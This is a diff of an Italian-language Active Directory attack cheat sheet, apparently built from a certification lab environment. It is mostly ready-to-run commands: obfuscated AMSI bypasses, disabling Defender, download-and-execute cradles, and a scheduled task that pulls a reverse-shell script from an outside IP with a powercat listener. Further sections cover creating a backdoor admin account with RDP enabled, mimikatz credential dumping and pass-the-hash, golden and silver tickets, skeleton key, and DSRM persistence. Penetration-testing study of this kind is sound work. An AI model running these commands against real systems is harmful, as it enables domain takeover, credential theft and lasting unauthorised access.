@@ -2,46 +2,15 @@
 # Summary
 * [General](#General)
 * [Domain Enumeration](#Domain-Enumeration)
-    * [Powerview Domain](#Powerview-Domain)
-    * [Powerview Users, groups and computers](#Powerview-users-groups-and-computers) 
-    * [Powerview Shares](#Powerview-shares)
-    * [Powerview GPO](#Powerview-GPO)
-    * [Powerview ACL](#Powerview-ACL)
-    * [Powerview Domain Trust](#Powerview-Domain-Trust)
-    * [Misc](#misc) 
 * [Local privilege escalation](#Local-privilege-escalation)
 * [Lateral Movement](#Lateral-Movement)
-   * [General](#General) 
-   * [Mimikatz](#Mimikatz) 
 * [Domain Persistence](#Domain-Persistence)
-   * [Golden Ticket](#Golden-Ticket) 
-   * [Silver Ticket](#Silver-Ticket)
-   * [Skeleton Key](#Skeleton-Key)
-   * [DSRM](#DSRM)
-   * [Custom SSP - Track logons](#Custom-SSP---Track-logons)
-   * [ACL](#ACL)
-      * [AdminSDHolder](#AdminSDHolder)
-      * [DCsync](#DCsync)
-      * [SecurityDescriptor - WMI](#SecurityDescriptor---WMI)
-      * [SecurityDescriptor - Powershell Remoting](#SecurityDescriptor---Powershell-Remoting)
-      * [SecurityDescriptor - Remote Registry](#SecurityDescriptor---Remote-Registry)
 * [Domain privilege escalation](#Domain-privilege-escalation)
-   * [Kerberoast](#Kerberoast) 
-   * [AS-REPS Roasting](#AS-REPS-Roasting) 
-   * [Set SPN](#Set-SPN) 
-   * [Unconstrained Delegation](#Unconstrained-delegation) 
-   * [Constrained Delegation](#Constrained-delegation) 
-   * [DNS Admins](#DNS-Admins) 
-   * [Abuse SQL](#Abuse-SQL) 
-   * [Enterprise Admins](#Enterprise-Admins) 
-      * [Child to parent - Trust tickets](#Child-to-parent---Trust-tickets)
-      * [Child to parent - krbtgt hash](#Child-to-parent---krbtgt-hash)
-   * [Crossforest attacks](#Crossforest-attacks)
-      * [Trust flow](#Trust-flow) 
+* [DCShadow](#DCShadow)
       
 
 # General
-## Bypass Execution Policy
+### Bypass Execution Policy
 ```
 	- powershell -ep bypass -c "command"
 	- powershell -c "command"
@@ -49,18 +18,51 @@
 	- $env:PSExecutionPolicyPreference="bypass"
 	
 ```
-## Disable Firewall
+### Use this parameter to not print errors in Powershell
+```
+	-ErrorAction SilentlyContinue	
+```
+### Rename Powershell
+```
+	$host.ui.RawUI.WindowTitle = "Claudione"	
+```
+
+### Disable Firewall
 ```
 	- Set-MpPreference -DisableRealtimeMonitoring $ture -Verbose
 	- Set-MpPreference -DisableIOAVprotection $true -Verbose
 ```
 
-## Enter in a new machine vias rdp or via powershell
+### Enter in a new machine vias rdp or via powershell
 
 ```
 	- Get-Credentials [via RDP]
 	- Enter-PSSession -ComputerName techsrv30.tech.finance.corp -Credential tech\techservice [successivamente verrà chiesta la password]
 ```
+### Load script on a machine
+```
+Invoke-Command -Computername <computername> -FilePath <path>
+Invoke-Command -FilePath <path> $sess
+```
+
+#### Download and load script on a machine
+```
+iex (iwr http://xx.xx.xx.xx/<scriptname> -UseBasicParsing)
+```
+
+### AMSI Bypass
+```
+sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+```
+
+```
+$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true)
+```
+
+```
+Invoke-Command -Scriptblock {sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )} $sess
+```
+
 # Domain-Enumeration
 
 ### PowerView:
@@ -151,7 +153,44 @@
 	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Invoke.UserHunter -Stealth"
 ```
 
-## Archiviazione e recupero credenziali memorizzate (Lateral Movement) [Local Admin nella macchina]
+
+# Local-privilege-escalation 
+### Privesc check all
+https://github.com/enjoiz/Privesc
+```
+. .\privesc.ps1
+Invoke-PrivEsc
+```
+### Beroot check all
+https://github.com/AlessandroZ/BeRoot
+```
+./beRoot.exe
+```
+
+###  Run powerup check all
+https://github.com/HarmJ0y/PowerUp
+```
+. ./powerup
+Invoke-allchecks
+```
+###  Run powerup get services with unqouted paths and a space in their name
+```
+Get-ServiceUnquoted -Verbose
+Get-ModifiableServiceFile -Verbose
+```
+
+###  Abuse service to get local admin permissions with powerup
+```
+Invoke-ServiceAbuse
+Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName '<domain>\<username>'
+```
+
+### Add user to local admin and RDP group and enable RDP on firewall
+```
+net user <username> <password> /add /Y   && net localgroup administrators <username> /add   && net localgroup "Remote Desktop Users" <username> /add && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+```
+# Lateral-Movement
+## Archiviazione e recupero credenziali memorizzate [Local Admin nella macchina]
 ### Poiché l'implementazione di Kerberos da parte di Microsoft utilizza il single sign-on, gli hash delle password devono essere archiviati da qualche parte per rinnovare una richiesta TGT. Nelle versioni correnti di Windows, questi hash sono archiviati nello spazio di memoria LSASS (Local Security Authority Subsystem Service). Se otteniamo l'accesso a questi hash, potremmo craccarli per ottenere la password in chiaro o riutilizzarli per eseguire varie azioni.
 ### Problemi: Sebbene questo sia l'obiettivo finale del nostro attacco AD, il processo non è così semplice come sembra. Poiché il processo LSASS fa parte del sistema operativo e viene eseguito come SYSTEM, abbiamo bisogno delle autorizzazioni SYSTEM (o amministratore locale) per ottenere l'accesso agli hash archiviati su una destinazione.Per questo motivo, per prendere di mira gli hash archiviati, spesso dobbiamo iniziare il nostro attacco con un'escalation dei privilegi locali. Per rendere le cose ancora più complicate, le strutture di dati utilizzate per archiviare gli hash in memoria non sono pubblicamente documentate e sono anche crittografate con una chiave archiviata in LSASS.
 ##Prerequisito: Devi essere Local Domain Admin dentro la macchina exploitata 
@@ -176,44 +215,47 @@
 			- Import-Module Invoke-Mimikatz.ps1
 			- Invoke-Mimikatz -Command ' "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit" '
 ```
-- Over pass the Hash
+- Mimikatz pass the Hash
 ```
 			- powershell -ep bypass
 			- Import-Module Invoke-Mimikatz.ps1
-			- Invoke-Mimikatz -Command '"sekurlsa::pth" "user:Administrator" "domain:dollarcorp.moneycorp.local" "ntlm:<ntlmhash>" "run:powershell.exe"'
+			- Invoke-Mimikatz -Command '"sekurlsa::pth" "/user:Administrator" "/domain:dollarcorp.moneycorp.local" "/ntlm:<ntlmhash>" "/run:powershell.exe"'
 ```
 o
 ```
 			- Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt
 ```
-
+# Domain-Persistence
 ## Golden Ticket [Domain Admins]
 ### Tornando alla spiegazione dell'autenticazione Kerberos, ricordiamo che quando un utente inoltra una richiesta per un TGT, il KDC crittografa il TGT con una chiave segreta nota solo ai KDC nel dominio. Questa chiave segreta è in realtà l'hash della password di un account utente di dominio chiamato krbtgt. Se riusciamo a mettere le mani sull'hash della password krbtgt, potremmo creare i nostri TGT personalizzati o biglietti d'oro.
 ### Ad esempio, potremmo creare un TGT in cui si afferma che un utente senza privilegi è in realtà un membro del gruppo Domain Admins e il controller di dominio lo considererà attendibile poiché è crittografato correttamente.
 ## Prerequisito: In questa fase del coinvolgimento, dovremmo avere accesso a un account che è un membro del gruppo Domain Admins oppure aver compromesso il controller di dominio stesso.  
 
-- Ottenere nel DC come DA HASH krbtgt 
+- Ottenere hash krbtgt 
 ```
 			- powershell -ep bypass
 			- Import-Module Invoke-Mimikatz.ps1
 			- Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dc-corp
 ```
-
+o
 ```
 			- certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
 			- mimikatz.exe '"lsadump::lsa /patch"' -Computername dc-corp
 ```
-- Usare HASH krbtgt per creare un Golden ticket per un user non autenticato 
+- Usare HASH krbtgt per creare un Golden ticket per un user non autenticato . Si può usare /ticket invece che /ptt per salvare il ticket
 ```
 			- powershell -ep bypass
 			- Import-Module Invoke-Mimikatz.ps1
 			- Invoke-Mimikatz -Command '"kerberos::golden" "/domain:$DOMAIN" "/sid:$DOMAIN_SID" "/krbtgt:$NTLM_HASH" "id:500" "groups:512" "/user:fakeuser" "/ptt"'
-```	
+```
+o
 ```
 			- certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
 			- mimikatz.exe '"kerberos::golden" "/domain:$DOMAIN" "/sid:$DOMAIN_SID" "id:500" "groups:512" "/krbtgt:$NTLM_HASH" "/user:fakeuser" "/ptt"'
 ```
+
 - Si può usare la funzione DCSync per ottenere hash krbtgt usando Mimikatz
+
 ```
 			- mimikatz.exe '"lsadump::dcsync" "/user:$DOMAIN\krbtgt"'
 			- Invoke-Mimikatz -Command  '"lsadump::dcsync" "/user:$DOMAIN\krbtgt"'
@@ -223,23 +265,32 @@ o
 ### Mentre un ticket Golden viene crittografato/firmato con l'account del servizio Kerberos di dominio (KRBTGT) , un ticket Silver viene crittografato/firmato dall'account del servizio (credenziale dell'account del computer estratta dal SAM locale del computer o credenziale dell'account del servizio)
 ### I biglietti d'argento possono essere più pericolosi dei biglietti d'oro: sebbene l'ambito sia più limitato dei biglietti d'oro, l'hash richiesto è più facile da ottenere e non c'è comunicazione con un controller di dominio quando li si utilizza, quindi il rilevamento è più difficile di quelli d'oro Biglietti.
 ## Prerequisito: Per creare o falsificare un Silver Ticket, l'attaccante deve conoscere i dati della password (hash) per il servizio di destinazione. Se il servizio di destinazione è in esecuzione nel contesto di un account utente, come MS-SQL, è necessario l'hash della password dell'account di servizio per creare un Silver Ticket. (https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket)
+
 - Servizio CIFS (Ma possono essere altri servizi come HOST). Il servizio CIFS permette di accedere al file system della vittima.
 ```
 			- powershell -ep bypass
 			- Import-Module Invoke-Mimikatz.ps1
 			- Invoke-Mimikatz -Command '"kerberos::golden" "/domain:$DOMAIN" "/sid:$DOMAIN_SID" "/service:CIFS" "/target:mgmtsrv.TECH.FINANCE.CORP" /user:Administrator /rc4:$NTLM_HASH_Service_Account /ptt'
 ```
+
 - Servizio HOST (schedule a task sul target).
 ```
 			- powershell -ep bypass
 			- Import-Module Invoke-Mimikatz.ps1
 			- Invoke-Mimikatz -Command '"kerberos::golden" "/domain:$DOMAIN" "/sid:$DOMAIN_SID" "/service:HOST" "/target:mgmtsrv.TECH.FINANCE.CORP" /user:Administrator /rc4:$NTLM_HASH_Service_Account /ptt'
+			
+```
+
+- Schedulare e eseguire un task dopo aver avuto un Silver ticket
+```
+		
 			- schtasks /create /S mgmtsrv.TECH.FINANCE.CORP /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString('http://172.16.100.68:8080/Invoke-PowerShellTcp.ps1')'"
 			- schtasks /Run /S mgmtsrv.TECH.FINANCE.CORP /TN "STCheck"
 			- Import-Module powercat.ps1
 			- powercat -l -v -t 1000 -p 2023
-Execute the task
+
 ```
+
 ## Skeleton Key [Domain Admins]
 ### Questo attacco si impianta in LSASS e crea una password principale che funzionerà per qualsiasi account Active Directory nel dominio. Poiché anche le attuali password degli utenti continuano a funzionare, un attacco Skeleton Key non interromperà il processo di autenticazione, quindi gli attacchi sono difficili da individuare a meno che tu non sappia cosa cercare. Il riavvio del DC rimuoverà questo attacco. Si potrà accedere a qualsiasi pc con username valido e password che di default sarà mimikatz
 ## Prerequisiti: Essere un utente del gurppo Domain Admins
@@ -247,25 +298,62 @@ Execute the task
 			- powershell -ep bypass
 			- Import-Module Invoke-Mimikatz.ps1
 			- Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName FQDN
-```	
+```
+o
+
 ```
 			- certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
 			- mimikatz.exe '"privilege::debug" "misc::skeleton" "/target: FQDN_DC"'
 			- Enter-PSSession -Computername DC -credential Domain\Administrator
-```			
+```
+
 ### Se LSASS sta runnando come processo protetto si può usare ancora questa tecnica, tuttavia avrà bisogno del driver mimikatz(mimidriv.sys) sul disco del DC target
+
 ```
 			- powershell -ep bypass
 			- Import-Module Invoke-Mimikatz.ps1
 			- Invoke-Mimikatz -Command '"privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "misc::skeleton" "!-"' -ComputerName FQDN
-```	
+```
+o
+
 ```
 			- certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
 			- mimikatz.exe '"privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "/target: FQDN_DC" "misc::skeleton" "!-"'
 			- Enter-PSSession -Computername DC -credential Domain\Administrator
 ```
 
+## DSRM (Directory Services Restore Mode) [Domain Admins]
+### C'è un local administrator su ogni DC chiamato Administrator la cui password è DSRM password. Tale password è richiesta quando un server è promosso a DC e viene cambiata raramente. Quindi è possibile usare NTLM hash di questo user per accedere a DC.
 
+```
+			- powershell -ep bypass
+			- Import-Module Invoke-Mimikatz.ps1
+			- Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName dc-host-name
+			- Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dc-host-name (comparazione Admin hash con admin hash di questo comando. Il primo è quello DSRM)
+			- Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior (verifichi se c'è il valore)
+			- New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" (se valore non esiste)
+			- Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2" (valore già esiste e lo cambi)
+			- Invoke-Mimikatz -Command  '"sekurlsa::pth" "/domain:dc-host-name" "/user:Administrator" "/ntlm:HASH_DSRM" "/run:powershell.exe"'
+			- ls \\dc-host-name\C$
+```
+o
+```
+			- certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
+			- mimikatz.exe '"token::elevate" "lsadump::sam" "/target: dc-host-name"'
+			- mimikatz.exe '"/target: FQDN_DC" "lsadump::lsa /patch"'
+			- Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
+			- New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
+			- Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
+			- mimikatz.exe '"sekurlsa::pth" "/domain:dc-host-name" "/user:Administrator" "/ntlm:HASH_DSRM" "/run:powershell.exe"'
+			- ls \\dc-host-name\C$
+	
+```
+
+
+
+
+
+# Domain-privilege-escalation
 ## Contrained Delegation [Local Admin on machine]
 ### 1) Un utente, Joe, si autentica al servizio web (in esecuzione con l'account servizio studvm ) utilizzando un meccanismo di autenticazione non compatibile con Kerberos.
 ### 2) Il servizio web richiede un ticket al Key Distribution Center (KDC) per l'account di Joe.
@@ -358,31 +446,7 @@ Execute the task
 
 
 
-## DSRM (Directory Services Restore Mode) [Domain Admins]
-### C'è un local administrator su ogni DC chiamato Administrator la cui password è DSRM password. Tale password è richiesta quando un server è promosso a DC e viene cambiata raramente. Quindi è possibile usare NTLM hash di questo user per accedere a DC.
-## Prerequisiti: Richiesto Domain Admins privileges
-```
-			- powershell -ep bypass
-			- Import-Module Invoke-Mimikatz.ps1
-			- Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName dc-host-name
-			- Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dc-host-name (comparazione Admin hash con admin hash di questo comando. Il primo è quello DSRM)
-			- Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
-			- New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
-			- Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
-			- Invoke-Mimikatz -Command  '"sekurlsa::pth" "/domain:dc-host-name" "/user:Administrator" "/ntlm:HASH_DSRM" "/run:powershell.exe"'
-			- ls \\dc-host-name\C$
-```	
-```
-			- certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
-			- mimikatz.exe '"token::elevate" "lsadump::sam" "/target: dc-host-name"'
-			- mimikatz.exe '"/target: FQDN_DC" "lsadump::lsa /patch"'
-			- Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
-			- New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
-			- Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
-			- mimikatz.exe '"sekurlsa::pth" "/domain:dc-host-name" "/user:Administrator" "/ntlm:HASH_DSRM" "/run:powershell.exe"'
-			- ls \\dc-host-name\C$
-	
-```
+
 
 ## Custom SSP (Security Support Provider) [Local Admin nella macchina]
 ### La SSP è una DLL la quale fornisce una via per un applicazione di ottenere una comunicazione autenticata. Alcune SSP di Microsoft sono NTLM,Kerberos,WDigest. L'SSPI si occuperà di trovare il protocollo adeguato per due macchine che vogliono comunicare. Il metodo preferito è Kerberos. Questi protocolli di autenticazione sono chiamati Security Support Provider (SSP), si trovano all'interno di ogni macchina Windows sotto forma di DLL ed entrambi i computer devono supportarli per poter comunicare. Mimikatz fornisce una SSP personalizzata chiamata (mimilib.dll). Questo SSP registra i logon locali, account di servizio e le password degli account macchina in testo chiaro sul server di destinazione.
@@ -500,7 +564,7 @@ Execute the task
 			- ls \\mcorpdc.moneycorp.local\C$
 ```
 
-## DCShadow
+# DCShadow
 ### DCShadow allows an attacker with enough privileges to create a rogue Domain Controller and push changes to the DC Active Directory objects.
 ### Per impostazione predefinita, i privilegi DA sono necessari per utilizzare DCShadow. La macchina dell'aggressore deve far parte del dominio principale.
 ### Per questo attacco sono necessarie due shell: una in esecuzione con privilegi SYSTEM e una con privilegi di un utente che fa parte del gruppo Domain Admins.
